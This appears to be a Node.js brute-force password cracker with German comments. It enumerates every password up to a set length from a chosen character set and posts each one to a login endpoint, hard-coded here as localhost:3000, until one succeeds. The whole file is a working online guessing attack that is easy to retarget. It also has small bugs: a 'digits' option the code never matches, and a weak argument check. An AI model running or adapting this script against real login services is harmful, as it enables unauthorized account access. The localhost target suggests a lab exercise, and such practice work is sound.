function usage() {
    console.log('Usage: node crack.js <username> <charset> <maxlen>');
    console.log(' charset: digits | lower | upper | symbols | mixed');
    process.exit(1);
}

// Überprüfe, ob genügend Argumente übergeben wurden
if (process.argv.length < 4) usage();

// Extrahiere Kommandozeilenargumente
const USERNAME = process.argv[2];      // Zu testender Benutzername
const CHARSET_NAME = process.argv[3];  // Name des Zeichensatzes
const MAXLEN = parseInt(process.argv[4], 10);  // Maximale Passwortlänge

// Initialisiere den Zeichensatz basierend auf dem übergebenen Namen
let CHARS = '';
if (CHARSET_NAME === 'chars')
    CHARS = '0123456789';  // Nur Ziffern
else if (CHARSET_NAME === 'lower')
    CHARS = 'abcdefghijklmnopqrstuvwxyz';  // Nur Kleinbuchstaben
else if (CHARSET_NAME === 'upper')
    CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';  // Nur Großbuchstaben
else if (CHARSET_NAME === 'symbols')
    CHARS = '!@#$%^&*()_+-=[]{}|;:,.<>?';  // Nur Sonderzeichen
else if (CHARSET_NAME === 'mixed')
    // Gemischter Zeichensatz: Buchstaben, Ziffern und Sonderzeichen
    CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
else {
    console.error('Unknown charset:', CHARSET_NAME);
    usage();
}

console.log(`Target user: ${USERNAME}, charset=${CHARSET_NAME}, maxlen=${MAXLEN}`);
console.log('Starting local-only brute-force (Node). Stop with Ctrl+C.');

// Flag, um anzuzeigen, ob das Passwort gefunden wurde
let found = false;

/**
 * Testet einen einzelnen Passwort-Kandidaten gegen den Login-Endpoint.
 *
 * @param {string} candidate - Das zu testende Passwort
 * @returns {Promise<boolean>} - true, wenn das Passwort korrekt ist, sonst false
 */
async function tryCandidate(candidate) {
    const url = "http://localhost:3000/login";

    // Maskiere das Passwort in der Ausgabe (zeige nur die letzten 2 Zeichen)
    console.log(`Trying candidate (masked): ${candidate.replace(/.(?=.{2})/g, '*')}`);

    // Erstelle den Request-Body mit Benutzername und Passwort
    const body = {username: USERNAME, password: candidate};

    try {
        // Sende POST-Request an den Login-Endpoint
        const resp = await fetch(url, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(body)
        });

        if (resp.status === 200) {
            // Status 200: Login erfolgreich - Passwort gefunden!
            console.log(`Found: ${candidate}`);
            found = true;
            return true;
        } else if (resp.status === 401) {
            // Status 401: Unauthorized - falsches Passwort
            return false;
        } else {
            // Unerwarteter Status-Code
            const text = await resp.text().catch(() => '');
            console.warn('Unexpected response', resp.status, text);
            return false;
        }
    } catch (err) {
        // Fehlerbehandlung für Netzwerkfehler
        console.error('Network/error:', err.message);
        return false;
    }
}

/**
 * Generiert systematisch alle möglichen Passwort-Kombinationen und testet sie.
 *
 * Die Funktion arbeitet iterativ durch alle Längen (1 bis maxlen) und generiert
 * für jede Länge alle möglichen Kombinationen aus dem Zeichensatz.
 *
 * @param {string[]} chars - Array mit allen verfügbaren Zeichen
 * @param {number} maxlen - Maximale Länge der zu testenden Passwörter
 */
async function generateAndTest(chars, maxlen) {
    // Iteriere über alle Passwortlängen von 1 bis maxlen
    for (let len = 1; len <= maxlen; len++) {
        // Initialisiere Index-Array (repräsentiert Position im Zeichensatz)
        const idx = new Array(len).fill(0);

        while (true) {
            // Erstelle das aktuelle Passwort-Kandidat aus den Indices
            const candidate = idx.map(i => chars[i]).join('');

            // Teste den Kandidaten
            await tryCandidate(candidate);

            // Wenn Passwort gefunden, beende die Suche
            if (found) return;

            // Inkrementiere die Indices (wie ein Zählwerk)
            let pos = len - 1;  // Beginne bei der letzten Position
            while (pos >= 0) {
                idx[pos]++;
                // Wenn Index gültig bleibt, fertig
                if (idx[pos] < chars.length) break;
                // Sonst: Überlauf, setze auf 0 und gehe zur nächsten Position
                idx[pos] = 0;
                pos--;
            }

            // Wenn alle Positionen übergelaufen sind, sind alle Kombinationen dieser Länge durch
            if (pos < 0) break;
        }
    }
}

// Starte den Brute-Force-Prozess
generateAndTest(CHARS.split(''), MAXLEN)
    .then(() => {
        if (!found) {
            console.log('No match found within given limits.');
            process.exit(1);
        }
    })
    .catch(err => {
        console.error('ERROR', err);
        process.exit(2);
    });